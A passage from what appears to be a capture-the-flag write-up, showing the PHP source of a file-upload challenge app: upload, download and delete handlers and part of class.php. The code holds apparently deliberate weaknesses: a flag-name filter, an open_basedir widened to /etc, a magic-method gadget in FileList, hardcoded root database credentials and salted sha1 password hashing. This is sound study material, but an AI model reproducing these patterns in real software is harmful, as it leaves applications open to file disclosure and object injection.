    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">:</span>
            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".gif"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">:</span>
            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".jpg"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">:</span>
            <span class="token variable">$fileext</span> <span class="token operator">=</span> <span class="token string double-quoted-string">".png"</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>
            <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Only gif/jpg/png allowed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$dst</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token variable">$filename</span> <span class="token operator">.</span> <span class="token variable">$fileext</span><span class="token punctuation">;</span>
        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$dst</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Invaild filename"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>download.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename="</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>delete.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"success"</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"error"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>class.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>
<span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dropbox"</span><span class="token punctuation">;</span>
<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>
        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/th>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>
        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;tr>'</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/td>'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
